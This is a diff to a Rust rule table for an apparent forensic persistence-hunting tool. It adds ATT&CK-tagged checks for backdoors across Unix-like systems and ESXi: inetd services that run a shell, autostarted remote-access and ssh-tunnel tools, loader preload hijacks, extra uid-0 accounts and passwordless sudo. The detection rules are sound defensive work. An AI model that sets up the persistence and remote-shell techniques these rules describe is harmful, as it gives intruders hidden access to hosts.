@@ -40,6 +40,7 @@ const fn chk(
 }
 
 const PERSIST: &str = "Persistence";
+const C2: &str = "Command and Control";
 
 /// One row per (check, artifact). A check that needs a different technique for a different kind
 /// of record (launchd agents and daemons, cron scripts and init scripts) appears twice.
@@ -106,7 +107,8 @@ pub static CHECKS: &[Check] = &[
     ),
     chk("rc-local-command", "rc-local", "T1037.004", PERSIST, Low, "rc.local runs a command at boot", |r| {
         let line = text(r, "text").trim();
-        (line != "exit 0").then(|| line.to_string())
+        // `touch /var/lock/subsys/local` is the one line the RHEL family ships in rc.local.
+        (line != "exit 0" && line != "touch /var/lock/subsys/local").then(|| line.to_string())
     }),
     chk("rc-local-suspicious", "rc-local", "T1037.004", PERSIST, High, "rc.local runs a suspicious command", |r| {
         susp(r, "text")
@@ -164,8 +166,10 @@ pub static CHECKS: &[Check] = &[
         modprobe_install,
     ),
     chk("pam-exec-module", "pam", "T1556.003", "Credential Access", Medium, "PAM stack runs pam_exec", |r| {
-        (text(r, "module_type") != "@include" && text(r, "module").ends_with("pam_exec.so"))
-            .then(|| format!("{}: pam_exec.so {}", text(r, "service"), text(r, "arguments")))
+        (text(r, "module_type") != "@include"
+            && text(r, "module").ends_with("pam_exec.so")
+            && !stock_pam_exec(text(r, "arguments")))
+        .then(|| format!("{}: pam_exec.so {}", text(r, "service"), text(r, "arguments")))
     }),
     chk(
         "pam-module-unusual-path",
@@ -191,7 +195,12 @@ pub static CHECKS: &[Check] = &[
         |r| susp(r, "exec"),
     ),
     chk("passwd-extra-uid0", "passwd", "T1136.001", PERSIST, High, "Account other than root with uid 0", |r| {
-        (r["uid"].as_u64() == Some(0) && text(r, "user") != "root").then(|| format!("{} has uid 0", text(r, "user")))
+        // `toor` is the stock BSD alternate root account: no password, this exact comment.
+        let stock_toor = text(r, "user") == "toor"
+            && text(r, "password_field") == "*"
+            && text(r, "gecos") == "Bourne-again Superuser";
+        (r["uid"].as_u64() == Some(0) && text(r, "user") != "root" && !stock_toor)
+            .then(|| format!("{} has uid 0", text(r, "user")))
     }),
     chk(
         "passwd-password-in-passwd",
@@ -217,7 +226,184 @@ pub static CHECKS: &[Check] = &[
         "sudo rule allows every command without a password",
         |r| {
             let all = text(r, "commands").split(',').any(|c| c.trim() == "ALL");
-            (text(r, "kind") == "rule" && r["nopasswd"] == true && all).then(|| text(r, "text").to_string())
+            let default_account = r["joined"]["default_account"].is_string();
+            (text(r, "kind") == "rule" && r["nopasswd"] == true && all && !default_account)
+                .then(|| text(r, "text").to_string())
+        },
+    ),
+    chk(
+        "systemd-timer-suspicious-service",
+        "systemd-units",
+        "T1053.006",
+        PERSIST,
+        High,
+        "systemd timer starts a service that runs a suspicious command",
+        |r| activated_exec(r, "timer"),
+    ),
+    chk(
+        "systemd-trigger-suspicious-service",
+        "systemd-units",
+        "T1543.002",
+        PERSIST,
+        High,
+        "systemd socket or path unit starts a service that runs a suspicious command",
+        |r| activated_exec(r, "socket").or_else(|| activated_exec(r, "path")),
+    ),
+    chk(
+        "systemd-enablement-outside-unit-dirs",
+        "systemd-enablement",
+        "T1543.002",
+        PERSIST,
+        Medium,
+        "Enabled or linked unit file lives outside the unit directories",
+        enablement_outside_unit_dirs,
+    ),
+    chk("systemd-linger", "systemd-enablement", "T1543.002", PERSIST, Low, "User services run without a login", |r| {
+        (text(r, "kind") == "linger").then(|| format!("lingering enabled for {}", text(r, "owner")))
+    }),
+    chk(
+        "systemd-generator-in-etc",
+        "systemd-generators",
+        "T1543.002",
+        PERSIST,
+        Medium,
+        "systemd generator installed under /etc",
+        |r| Some(format!("{} (mode {}, uid {})", text(r, "source_path"), text(r, "mode"), r["uid"])),
+    ),
+    chk(
+        "motd-script-suspicious",
+        "motd-scripts",
+        "T1037",
+        PERSIST,
+        High,
+        "Message-of-the-day script runs a suspicious command",
+        |r| susp(r, "text"),
+    ),
+    chk(
+        "nm-dispatcher-suspicious",
+        "nm-dispatcher",
+        "T1546",
+        PERSIST,
+        High,
+        "NetworkManager dispatcher script runs a suspicious command",
+        |r| susp(r, "text"),
+    ),
+    chk(
+        "logrotate-script-suspicious",
+        "logrotate-scripts",
+        "T1053",
+        PERSIST,
+        High,
+        "logrotate script runs a suspicious command",
+        |r| susp(r, "text").map(|d| format!("{} {d}", text(r, "section"))),
+    ),
+    chk(
+        "environment-ld-preload",
+        "shell-profiles",
+        "T1574.006",
+        PERSIST,
+        High,
+        "Session environment preloads or redirects libraries",
+        |r| (text(r, "source_path") == "etc/environment").then(|| env_library_hijack(text(r, "text"))).flatten(),
+    ),
+    chk(
+        "environment-ld-preload",
+        "env-config",
+        "T1574.006",
+        PERSIST,
+        High,
+        "Session environment preloads or redirects libraries",
+        |r| env_library_hijack(text(r, "text")),
+    ),
+    chk(
+        "environment-path-hijack",
+        "shell-profiles",
+        "T1574.007",
+        PERSIST,
+        Medium,
+        "Session PATH contains a temporary, hidden or relative directory",
+        |r| (text(r, "source_path") == "etc/environment").then(|| env_path_hijack(text(r, "text"))).flatten(),
+    ),
+    chk(
+        "environment-path-hijack",
+        "env-config",
+        "T1574.007",
+        PERSIST,
+        Medium,
+        "Session PATH contains a temporary, hidden or relative directory",
+        |r| env_path_hijack(text(r, "text")),
+    ),
+    chk(
+        "sshd-authorized-keys-command",
+        "sshd-config",
+        "T1098.004",
+        PERSIST,
+        Medium,
+        "sshd fetches authorized keys by running a command",
+        |r| {
+            // The two commands that systemd and SSSD ship, exactly as they ship them.
+            let stock = ["/usr/bin/userdbctl ssh-authorized-keys %u", "/usr/bin/sss_ssh_authorizedkeys %u"];
+            (text(r, "keyword") == "AuthorizedKeysCommand"
+                && !["", "none"].contains(&text(r, "value"))
+                && !stock.contains(&text(r, "value")))
+            .then(|| format!("AuthorizedKeysCommand {}", text(r, "value")))
+        },
+    ),
+    chk("sshd-force-command", "sshd-config", "T1098.004", PERSIST, Medium, "sshd forces a command on login", |r| {
+        let value = text(r, "value");
+        let sftp = value == "internal-sftp" || value.starts_with("internal-sftp ");
+        (text(r, "keyword") == "ForceCommand" && !["", "none"].contains(&value) && !sftp).then(|| {
+            let scope = text(r, "match_condition");
+            format!(
+                "ForceCommand {value}{}",
+                if scope.is_empty() { String::new() } else { format!(" (Match {scope})") }
+            )
+        })
+    }),
+    chk("sshd-command-suspicious", "sshd-config", "T1098.004", PERSIST, High, "sshd runs a suspicious command", |r| {
+        ["AuthorizedKeysCommand", "ForceCommand"]
+            .contains(&text(r, "keyword"))
+            .then(|| susp(r, "value").map(|d| format!("{} {d}", text(r, "keyword"))))
+            .flatten()
+    }),
+    chk(
+        "modules-load-unknown-module",
+        "modules-load",
+        "T1547.006",
+        PERSIST,
+        Medium,
+        "Module loaded at boot is not in the collected kernel tree",
+        |r| {
+            (r["module_in_kernel_tree"] == false)
+                .then(|| format!("loads {}, which is not under lib/modules", text(r, "module")))
+        },
+    ),
+    chk(
+        "ld-library-path-unusual",
+        "ld-preload",
+        "T1574.006",
+        PERSIST,
+        Low,
+        "Linker search path outside the standard library directories",
+        |r| {
+            let path = text(r, "path");
+            let usual = ["/lib", "/lib32", "/lib64", "/libx32", "/usr/lib", "/usr/lib32", "/usr/lib64", "/usr/libx32"];
+            let local = path.strip_prefix("/usr/local/").is_some_and(|rest| rest == "lib" || rest.starts_with("lib"));
+            let inside = |dir: &&str| path == *dir || path.strip_prefix(*dir).is_some_and(|rest| rest.starts_with('/'));
+            (text(r, "kind") == "library_path" && !local && !usual.iter().any(inside))
+                .then(|| format!("search path {path}"))
+        },
+    ),
+    chk(
+        "sudoers-default-account-nopasswd",
+        "sudoers",
+        "T1548.003",
+        "Privilege Escalation",
+        Low,
+        "sudo rule gives the image's default account passwordless sudo",
+        |r| {
+            let account = r["joined"]["default_account"].as_str()?;
+            Some(format!("{account} (uid 1000) may run every command without a password: {}", text(r, "text")))
         },
     ),
     chk(
@@ -286,8 +472,817 @@ pub static CHECKS: &[Check] = &[
         let path = text(r, "executable_path");
         let anonymous = text(r, "team_id").is_empty() && ["", "Unknown Developer"].contains(&text(r, "developer_name"));
         (anonymous && !path.is_empty() && !path.starts_with("/System/")).then(|| path.to_string())
+    }), // Solaris and illumos (the functions are in `hunt_solaris.rs`).
+    chk(
+        "smf-start-method-suspicious",
+        "smf-repository",
+        "T1543",
+        PERSIST,
+        High,
+        "SMF service starts a program from a temporary or hidden location",
+        solaris::smf_start_method,
+    ),
+    chk(
+        "smf-site-service-enabled",
+        "smf-repository",
+        "T1543",
+        PERSIST,
+        Low,
+        "Enabled SMF service imported from a site manifest",
+        solaris::smf_site_service,
+    ),
+    chk(
+        "smf-manifest-suspicious-exec",
+        "smf-manifests",
+        "T1543",
+        PERSIST,
+        High,
+        "SMF manifest runs a program from a temporary or hidden location",
+        solaris::smf_manifest_exec,
+    ),
+    chk(
+        "smf-manifest-site",
+        "smf-manifests",
+        "T1543",
+        PERSIST,
+        Low,
+        "Locally added SMF manifest",
+        solaris::smf_manifest_present,
+    ),
+    chk(
+        "inittab-unusual-entry",
+        "inittab",
+        "T1037.004",
+        PERSIST,
+        Medium,
+        "init entry that is not in the stock inittab",
+        solaris::inittab_unusual,
+    ),
+    chk(
+        "inittab-suspicious-command",
+        "inittab",
+        "T1037.004",
+        PERSIST,
+        High,
+        "init entry runs a suspicious command",
+        solaris::inittab_suspicious,
+    ),
+    chk(
+        "rc-script-suspicious",
+        "rc-scripts",
+        "T1037.004",
+        PERSIST,
+        High,
+        "Legacy rc script runs a suspicious command",
+        solaris::rc_script_lines,
+    ),
+    chk(
+        "rc-script-writable",
+        "rc-scripts",
+        "T1037.004",
+        PERSIST,
+        Medium,
+        "Legacy rc script is writable or not owned by root",
+        solaris::rc_script_writable,
+    ),
+    chk(
+        "crle-path-outside-system",
+        "crle-config",
+        "T1574.006",
+        PERSIST,
+        Medium,
+        "Runtime linker path outside the system directories",
+        solaris::crle_path,
+    ),
+    chk(
+        "crle-path-temporary",
+        "crle-config",
+        "T1574.006",
+        PERSIST,
+        High,
+        "Runtime linker path in a temporary or hidden directory",
+        solaris::crle_path_temp,
+    ),
+    chk(
+        "crle-environment-setting",
+        "crle-config",
+        "T1574.006",
+        PERSIST,
+        High,
+        "Runtime linker configuration sets environment variables",
+        solaris::crle_environment,
+    ),
+    chk(
+        "etc-system-forceload",
+        "etc-system",
+        "T1547.006",
+        PERSIST,
+        Medium,
+        "Kernel module forced to load at boot",
+        solaris::system_forceload,
+    ),
+    chk(
+        "etc-system-moddir",
+        "etc-system",
+        "T1547.006",
+        PERSIST,
+        High,
+        "Kernel module search path changed",
+        solaris::system_moddir,
+    ),
+    chk(
+        "kernel-drv-conf-without-module",
+        "kernel-drv",
+        "T1547.006",
+        PERSIST,
+        Medium,
+        "Driver configuration file with no driver module",
+        solaris::kernel_drv_no_module,
+    ),
+    chk(
+        "user-attr-root-equivalent",
+        "user-attr",
+        "T1098",
+        "Privilege Escalation",
+        Medium,
+        "Account holds a root-equivalent RBAC profile",
+        solaris::user_attr_root_equivalent,
+    ),
+    chk(
+        "rbac-exec-attr-root-outside-system",
+        "rbac-profiles",
+        "T1548",
+        "Privilege Escalation",
+        High,
+        "RBAC profile runs a program as root from outside the system directories",
+        solaris::rbac_exec_root,
+    ),
+    chk("at-job", "solaris-at-jobs", "T1053.002", PERSIST, Low, "Queued at job", solaris::at_job),
+    chk(
+        "at-job-suspicious",
+        "solaris-at-jobs",
+        "T1053.002",
+        PERSIST,
+        High,
+        "At job runs a suspicious command",
+        solaris::at_job_suspicious,
+    ),
+    chk(
+        "shadow-passwordless",
+        "solaris-shadow",
+        "T1078.003",
+        PERSIST,
+        High,
+        "Account has an empty password",
+        solaris::shadow_passwordless,
+    ),
+    chk(
+        "login-su-defaults",
+        "default-files",
+        "T1556",
+        "Credential Access",
+        High,
+        "login or su defaults weakened",
+        solaris::default_files,
+    ),
+    chk(
+        "pam-module-unusual-path",
+        "pam-conf",
+        "T1556.003",
+        "Credential Access",
+        High,
+        "PAM module loaded from an unusual path",
+        solaris::pam_module_path,
+    ),
+    chk(
+        "rhosts-wildcard",
+        "rhosts",
+        "T1021",
+        PERSIST,
+        High,
+        "r-command trust file trusts every host or user",
+        solaris::rhosts_wildcard,
+    ),
+    chk("rhosts-entry", "rhosts", "T1021", PERSIST, Low, "r-command trust entry", solaris::rhosts_entry),
+    // Kubernetes nodes, remote-access tools and tunnels.
+    chk(
+        "k8s-static-pod-unexpected",
+        "k8s-manifests",
+        "T1053.007",
+        PERSIST,
+        Medium,
+        "Static pod that is not a control-plane component",
+        static_pod_unexpected,
+    ),
+    chk(
+        "k8s-static-pod-host-access",
+        "k8s-manifests",
+        "T1610",
+        PERSIST,
+        High,
+        "Static pod with host namespaces or privileges and the host root or a container socket mounted",
+        static_pod_host_access,
+    ),
+    chk(
+        "k3s-auto-apply-not-stock",
+        "k8s-manifests",
+        "T1053.007",
+        PERSIST,
+        Medium,
+        "k3s applies a manifest that k3s does not ship",
+        k3s_auto_apply_not_stock,
+    ),
+    chk(
+        "kubelet-anonymous-auth",
+        "kubelet-config",
+        "T1556",
+        "Defense Evasion",
+        High,
+        "kubelet accepts anonymous requests",
+        |r| (r["anonymous_auth"] == true).then(|| "anonymous authentication is enabled".to_string()),
+    ),
+    chk(
+        "kubelet-authorization-always-allow",
+        "kubelet-config",
+        "T1556",
+        "Defense Evasion",
+        High,
+        "kubelet authorizes every authenticated request",
+        |r| (text(r, "authorization_mode") == "AlwaysAllow").then(|| "authorization mode is AlwaysAllow".to_string()),
+    ),
+    chk(
+        "remote-tool-autostart",
+        "systemd-units",
+        "T1219",
+        C2,
+        Low,
+        "Remote-access or tunnel tool configured to start",
+        |r| SYSTEMD_EXEC.iter().find_map(|f| remote_tool(text(r, f)).map(|t| format!("{t} ({f}){}", unit_state(r)))),
+    ),
+    chk("remote-tool-autostart", "cron", "T1219", C2, Low, "Remote-access or tunnel tool configured to start", |r| {
+        remote_tool(text(r, "command")).map(|t| format!("{t}: {}", text(r, "command")))
     }),
+    // FreeBSD, OpenBSD and NetBSD.
+    chk("rc-local-command", "bsd-rc-local", "T1037.004", PERSIST, Low, "rc.local runs a command at boot", |r| {
+        let line = text(r, "text").trim();
+        (line != "exit 0").then(|| line.to_string())
+    }),
+    chk("rc-local-suspicious", "bsd-rc-local", "T1037.004", PERSIST, High, "rc.local runs a suspicious command", |r| {
+        susp(r, "text")
+    }),
+    chk("at-job", "bsd-at-jobs", "T1053.002", PERSIST, Low, "Queued at job", |r| {
+        Some(format!("at job: {}", text(r, "command")))
+    }),
+    chk("at-job-suspicious", "bsd-at-jobs", "T1053.002", PERSIST, High, "At job runs a suspicious command", |r| {
+        susp(r, "command")
+    }),
+    chk(
+        "rc-d-script-writable",
+        "rc-d",
+        "T1037.004",
+        PERSIST,
+        Medium,
+        "rc.d script is writable or not owned by root",
+        script_writable,
+    ),
+    chk("rc-d-suspicious-command", "rc-d", "T1037.004", PERSIST, High, "rc.d script runs a suspicious command", |r| {
+        // The whole script body is searched too, but only for payload handling: base scripts
+        // mention /tmp and hidden paths all the time.
+        susp(r, "command").or_else(|| {
+            let body = text(r, "commands");
+            suspicious_command(body).filter(|why| !why.starts_with("runs from")).map(|why| format!("{why}: {body}"))
+        })
+    }),
+    chk(
+        "rc-conf-suspicious-service",
+        "rc-conf",
+        "T1037.004",
+        PERSIST,
+        High,
+        "Service enabled in rc.conf starts a suspicious command",
+        |r| susp(r, "command"),
+    ),
+    chk("loader-module-load", "loader-conf", "T1547.006", PERSIST, Low, "Kernel module loaded at boot", |r| {
+        (text(r, "kind") == "module_load" && r["enabled"] == true)
+            .then(|| format!("{} ({})", text(r, "module"), text(r, "variable")))
+    }),
+    chk(
+        "ttys-nonstandard-command",
+        "ttys",
+        "T1037.004",
+        PERSIST,
+        Medium,
+        "Terminal entry runs a program other than a getty",
+        |r| {
+            let command = text(r, "command");
+            let program = command.split_whitespace().next().unwrap_or_default().rsplit('/').next().unwrap_or_default();
+            let standard = ["getty", "xdm", "wdm", "gdm", "kdm", "sddm", "lightdm", "ttymsg", "ttyp"];
+            (!command.is_empty() && command != "none" && !standard.contains(&program))
+                .then(|| format!("{}: {command} ({})", text(r, "tty"), text(r, "status")))
+        },
+    ),
+    chk(
+        "ttys-suspicious-command",
+        "ttys",
+        "T1037.004",
+        PERSIST,
+        High,
+        "Terminal entry runs a suspicious command",
+        |r| susp(r, "command"),
+    ),
+    chk(
+        "doas-permit-nopass",
+        "doas-conf",
+        "T1548.003",
+        "Privilege Escalation",
+        Medium,
+        "doas rule allows every command without a password",
+        |r| {
+            (text(r, "action") == "permit" && r["nopass"] == true && text(r, "command").is_empty())
+                .then(|| text(r, "text").to_string())
+        },
+    ),
+    chk("devd-action-suspicious", "devd-conf", "T1546", PERSIST, High, "devd action runs a suspicious command", |r| {
+        susp(r, "command")
+    }),
+    chk("jail-exec-suspicious", "jail-conf", "T1543", PERSIST, High, "Jail start or stop command is suspicious", |r| {
+        susp(r, "command")
+    }),
+    chk(
+        "master-passwd-extra-uid0",
+        "master-passwd",
+        "T1136.001",
+        PERSIST,
+        High,
+        "Account other than root with uid 0",
+        |r| {
+            let user = text(r, "user");
+            // `toor` is the stock BSD alternate root account; it ships with no password.
+            let stock_toor =
+                user == "toor" && text(r, "hash_type") == "none" && text(r, "gecos") == "Bourne-again Superuser";
+            (r["uid"].as_u64() == Some(0) && user != "root" && !stock_toor).then(|| format!("{user} has uid 0"))
+        },
+    ),
+    chk(
+        "master-passwd-passwordless",
+        "master-passwd",
+        "T1078.003",
+        PERSIST,
+        High,
+        "Account has an empty password",
+        |r| (r["passwordless"] == true).then(|| format!("{} can log in without a password", text(r, "user"))),
+    ),
+    chk(
+        "remote-tool-autostart",
+        "anacron",
+        "T1219",
+        C2,
+        Low,
+        "Remote-access or tunnel tool configured to start",
+        |r| remote_tool(text(r, "command")).map(|t| format!("{t}: {}", text(r, "command"))),
+    ),
+    chk(
+        "remote-tool-autostart",
+        "at-jobs",
+        "T1219",
+        C2,
+        Low,
+        "Remote-access or tunnel tool configured to start",
+        |r| remote_tool(text(r, "command")).map(|t| format!("{t}: {}", text(r, "command"))),
+    ),
+    chk(
+        "remote-tool-autostart",
+        "rc-local",
+        "T1219",
+        C2,
+        Low,
+        "Remote-access or tunnel tool configured to start",
+        |r| remote_tool(text(r, "text")).map(|t| format!("{t}: {}", text(r, "text"))),
+    ),
+    chk(
+        "remote-tool-autostart",
+        "xdg-autostart",
+        "T1219",
+        C2,
+        Low,
+        "Remote-access or tunnel tool configured to start",
+        |r| remote_tool(text(r, "exec")).map(|t| format!("{t}: {}", text(r, "exec"))),
+    ),
+    chk(
+        "ssh-tunnel-command",
+        "systemd-units",
+        "T1572",
+        C2,
+        Medium,
+        "ssh forwarding or tunnel started from a unit",
+        |r| {
+            SYSTEMD_EXEC
+                .iter()
+                .find_map(|f| ssh_tunnel(text(r, f)).map(|t| format!("{f} {t}: {}{}", text(r, f), unit_state(r))))
+        },
+    ),
+    chk("ssh-tunnel-command", "cron", "T1572", C2, Medium, "ssh forwarding or tunnel started from cron", |r| {
+        ssh_tunnel(text(r, "command")).map(|t| format!("{t}: {}", text(r, "command")))
+    }),
+    chk("ssh-tunnel-command", "anacron", "T1572", C2, Medium, "ssh forwarding or tunnel started from anacron", |r| {
+        ssh_tunnel(text(r, "command")).map(|t| format!("{t}: {}", text(r, "command")))
+    }),
+    chk("ssh-tunnel-command", "at-jobs", "T1572", C2, Medium, "ssh forwarding or tunnel started from an at job", |r| {
+        ssh_tunnel(text(r, "command")).map(|t| format!("{t}: {}", text(r, "command")))
+    }),
+    chk("ssh-tunnel-command", "rc-local", "T1572", C2, Medium, "ssh forwarding or tunnel started from rc.local", |r| {
+        ssh_tunnel(text(r, "text")).map(|t| format!("{t}: {}", text(r, "text")))
+    }),
+    chk(
+        "remote-access-tool-present",
+        "remote-access-config",
+        "T1219",
+        C2,
+        Severity::Info,
+        "Remote-access or tunnel tool is configured on this host",
+        remote_tool_present,
+    ),
+    chk(
+        "tunnel-exposes-local-service",
+        "remote-access-config",
+        "T1572",
+        C2,
+        Medium,
+        "Tunnel or proxy exposes a local service",
+        tunnel_exposes_service,
+    ),
+    chk(
+        "vscode-tunnel-service-account",
+        "remote-access-config",
+        "T1219.001",
+        C2,
+        Medium,
+        "VS Code tunnel state for root or a service account",
+        vscode_tunnel_service_account,
+    ),
+    chk(
+        "vpn-hook-suspicious",
+        "remote-access-config",
+        "T1546",
+        PERSIST,
+        High,
+        "VPN configuration runs a suspicious command when the tunnel changes state",
+        vpn_hook_suspicious,
+    ),
+    chk("login-hook", "login-window", "T1037.002", PERSIST, Medium, "Login or logout hook configured", |r| {
+        matches!(text(r, "kind"), "login_hook" | "logout_hook")
+            .then(|| format!("{}: {}", text(r, "name"), text(r, "value")))
+    }),
+    chk(
+        "login-hook-suspicious",
+        "login-window",
+        "T1037.002",
+        PERSIST,
+        High,
+        "Login or logout hook runs a suspicious command",
+        |r| matches!(text(r, "kind"), "login_hook" | "logout_hook").then(|| susp(r, "value")).flatten(),
+    ),
+    chk(
+        "relaunch-app-user-location",
+        "login-window",
+        "T1547.007",
+        PERSIST,
+        Low,
+        "Application reopened at login runs from a user location",
+        |r| {
+            let path = text(r, "path");
+            let usual = ["/Applications/", "/System/", "/Library/", "/usr/"];
+            (text(r, "kind") == "relaunch_app" && !path.is_empty() && !usual.iter().any(|p| path.starts_with(p)))
+                .then(|| format!("{} ({})", path, text(r, "bundle_id")))
+        },
+    ),
+    chk(
+        "auth-db-admin-rule-allow",
+        "auth-db",
+        "T1556",
+        "Credential Access",
+        High,
+        "Authorization right system.privilege.admin set to allow",
+        // Apple's default (Security framework `authorization.plist`) is class `user`, group
+        // `admin`; class `allow` lets any process obtain the right without authenticating.
+        |r| {
+            (text(r, "name") == "system.privilege.admin" && text(r, "class") == "allow")
+                .then(|| "system.privilege.admin has class allow (default: user, group admin)".to_string())
+        },
+    ),
+    chk("startup-item", "startup-items", "T1037.005", PERSIST, Medium, "Legacy StartupItems entry", |r| {
+        // StartupItems is deprecated since OS X 10.10; a default install has none outside System.
+        let path = text(r, "source_path");
+        (!path.starts_with("System/")).then(|| format!("{path} (interpreter {})", text(r, "interpreter")))
+    }),
+    chk("legacy-rc-command", "legacy-rc", "T1037.004", PERSIST, Medium, "Command in rc.local or launchd.conf", |r| {
+        let (path, line) = (text(r, "source_path"), text(r, "text").trim());
+        (!path.ends_with("rc.common") && !line.is_empty()).then(|| line.to_string())
+    }),
+    chk(
+        "legacy-rc-suspicious",
+        "legacy-rc",
+        "T1037.004",
+        PERSIST,
+        High,
+        "rc.local or launchd.conf runs a suspicious command",
+        |r| (!text(r, "source_path").ends_with("rc.common")).then(|| susp(r, "text")).flatten(),
+    ),
+    chk(
+        "folder-action-script",
+        "folder-action-scripts",
+        "T1546",
+        PERSIST,
+        Medium,
+        "Folder Action script present",
+        |r| Some(format!("{} (interpreter {})", text(r, "source_path"), text(r, "interpreter"))),
+    ),
+    chk(
+        "authorization-plugin",
+        "system-plugins",
+        "T1556",
+        "Credential Access",
+        Medium,
+        "Third-party authorization or Directory Services plug-in",
+        |r| {
+            // Apple's own plug-ins live under /System; these two folders hold third-party ones.
+            let bundle_id = text(r, "bundle_id");
+            (matches!(text(r, "kind"), "authorization_plugin" | "directory_services_plugin")
+                && !bundle_id.starts_with("com.apple."))
+            .then(|| format!("{} ({bundle_id})", text(r, "source_path")))
+        },
+    ),
+    chk(
+        "config-profile-root-certificate",
+        "config-profiles",
+        "T1553.004",
+        "Defense Evasion",
+        Medium,
+        "Configuration profile installs a root certificate",
+        |r| {
+            r["payload_types"]
+                .as_array()
+                .is_some_and(|types| types.iter().any(|t| t == "com.apple.security.root"))
+                .then(|| {
+                    format!(
+                        "profile {} ({}) carries a com.apple.security.root payload",
+                        text(r, "name"),
+                        text(r, "identifier")
+                    )
+                })
+        },
+    ),
+    // ---- IBM AIX (artifacts `aix-*`; every format here is synthetic only, see docs/LIMITATIONS.md)
+    chk(
+        "aix-inittab-suspicious-command",
+        "aix-inittab",
+        "T1037.004",
+        PERSIST,
+        High,
+        "inittab entry runs a suspicious command",
+        |r| susp(r, "command").map(|why| format!("{} ({}): {why}", text(r, "id"), text(r, "action"))),
+    ),
+    chk(
+        "aix-inittab-nonsystem-command",
+        "aix-inittab",
+        "T1037.004",
+        PERSIST,
+        Medium,
+        "inittab entry runs a program outside the system directories",
+        aix_inittab_nonsystem,
+    ),
+    chk("aix-at-job", "aix-at-jobs", "T1053.002", PERSIST, Low, "Queued at job", |r| {
+        Some(format!("at job: {}", text(r, "command_tail")))
+    }),
+    chk("aix-at-job-suspicious", "aix-at-jobs", "T1053.002", PERSIST, High, "At job runs a suspicious command", |r| {
+        susp(r, "command_tail")
+    }),
+    chk(
+        "aix-rc-suspicious",
+        "aix-rc-scripts",
+        "T1037.004",
+        PERSIST,
+        High,
+        "AIX boot script runs a suspicious command",
+        |r| susp(r, "text"),
+    ),
+    chk(
+        "aix-inetd-suspicious-command",
+        "aix-inetd-conf",
+        "T1543",
+        PERSIST,
+        High,
+        "inetd service runs a suspicious command",
+        |r| {
+            let command = format!("{} {}", text(r, "program"), text(r, "arguments"));
+            suspicious_command(&command).map(|why| format!("{}: {why}: {command}", text(r, "service")))
+        },
+    ),
+    chk("aix-inetd-shell-service", "aix-inetd-conf", "T1059.004", "Execution", High, "inetd service is a shell", |r| {
+        let shell =
+            ["sh", "ksh", "ksh93", "bsh", "csh", "bash", "rksh"].contains(&base_name(text(r, "program")).as_str());
+        shell.then(|| format!("{} runs {} {}", text(r, "service"), text(r, "program"), text(r, "arguments")))
+    }),
+    chk(
+        "aix-rhosts-wildcard",
+        "aix-rhosts",
+        "T1021",
+        "Lateral Movement",
+        High,
+        "Remote-trust file trusts every host or user",
+        |r| {
+            (r["wildcard"] == true && r["denied"] != true).then(|| {
+                format!("{}: {} {}", text(r, "source_path"), text(r, "peer"), r["user"].as_str().unwrap_or(""))
+            })
+        },
+    ),
+    chk(
+        "aix-rhosts-user-file",
+        "aix-rhosts",
+        "T1021",
+        "Lateral Movement",
+        Medium,
+        ".rhosts grants remote login",
+        |r| {
+            (text(r, "file") == ".rhosts" && r["denied"] != true).then(|| {
+                format!("{} trusts {} {}", text(r, "source_path"), text(r, "peer"), r["user"].as_str().unwrap_or(""))
+            })
+        },
+    ),
+    chk(
+        "aix-loader-hijack",
+        "shell-profiles",
+        "T1574.006",
+        PERSIST,
+        High,
+        "Session environment sets LDR_PRELOAD or a temporary LIBPATH",
+        |r| aix_loader_hijack(text(r, "text")),
+    ),
+    chk(
+        "aix-kernel-extension-in-temp",
+        "aix-genkex",
+        "T1547.006",
+        PERSIST,
+        High,
+        "Kernel extension loaded from a temporary directory",
+        |r| starts_with_temp(text(r, "path")).then(|| format!("{} at {}", text(r, "path"), text(r, "address"))),
+    ),
+    chk(
+        "esxi-rc-local-command",
+        "esxi-rc-local",
+        "T1037.004",
+        PERSIST,
+        Medium,
+        "ESXi rc.local.d script runs a command at boot",
+        |r| {
+            let line = text(r, "text").trim();
+            // The stock local.sh is comments and `exit 0`; the comments are not records.
+            (line != "exit 0").then(|| line.to_string())
+        },
+    ),
+    chk(
+        "esxi-rc-local-suspicious",
+        "esxi-rc-local",
+        "T1037.004",
+        PERSIST,
+        High,
+        "ESXi rc.local.d script runs a suspicious command",
+        |r| susp(r, "text"),
+    ),
+    chk(
+        "esxi-rc-local-unexpected-file",
+        "esxi-rc-local-files",
+        "T1037.004",
+        PERSIST,
+        Medium,
+        "Unexpected file in ESXi /etc/rc.local.d",
+        esxi_rc_local_file,
+    ),
+    chk(
+        "esxi-vib-community",
+        "esxi-vib",
+        "T1543",
+        PERSIST,
+        Medium,
+        "VIB with the community acceptance level (not signed by VMware or a partner)",
+        esxi_community,
+    ),
+    chk(
+        "esxi-vib-community",
+        "esxi-vib-list",
+        "T1543",
+        PERSIST,
+        Medium,
+        "VIB with the community acceptance level (not signed by VMware or a partner)",
+        esxi_community,
+    ),
+    chk(
+        "esxi-vib-startup-file",
+        "esxi-vib",
+        "T1037.004",
+        PERSIST,
+        High,
+        "VIB installs a startup script or scheduled job",
+        esxi_vib_startup,
+    ),
+    chk(
+        "esxi-admin-permission",
+        "esxi-permissions",
+        "T1098",
+        PERSIST,
+        Medium,
+        "Local ESXi account or group with the Administrator role",
+        esxi_admin,
+    ),
+    chk(
+        "esxi-ssh-at-boot",
+        "esxi-host-config",
+        "T1133",
+        PERSIST,
+        Low,
+        "SSH or the ESXi Shell is set to start with the host",
+        |r| {
+            let key = text(r, "key");
+            let service = key.rsplit_once("/service/").map(|(_, name)| name)?;
+            (["TSM-SSH", "TSM"].contains(&service) && text(r, "value") == "on")
+                .then(|| format!("{service} starts with the host"))
+        },
+    ),
 ];
+
+#[path = "hunt_solaris.rs"]
+mod solaris;
+
+/// AIX's loader variables: `LDR_PRELOAD` and `LDR_PRELOAD64` (the `LD_PRELOAD` of AIX) set to
+/// anything, or `LIBPATH` with a directory an unprivileged user can write to.
+fn aix_loader_hijack(line: &str) -> Option<String> {
+    let (name, values) = env_assignment(line)?;
+    let hit = match name.as_str() {
+        "LDR_PRELOAD" | "LDR_PRELOAD64" => values.iter().any(|v| !v.is_empty()),
+        "LIBPATH" => values.iter().flat_map(|v| v.split(':')).any(starts_with_temp),
+        _ => false,
+    };
+    hit.then(|| format!("sets {name}={}", values.join(" ")))
+}
+
+/// An `inittab` command whose program is an absolute path outside the system directories
+/// (`/etc`, `/usr`, `/sbin`, `/bin`, `/opt`, `/lib`, `/var/opt`). There is no list of AIX's stock
+/// entries behind this: it only says the program is not where AIX and its products install.
+fn aix_inittab_nonsystem(record: &Value) -> Option<String> {
+    let command = text(record, "command").trim();
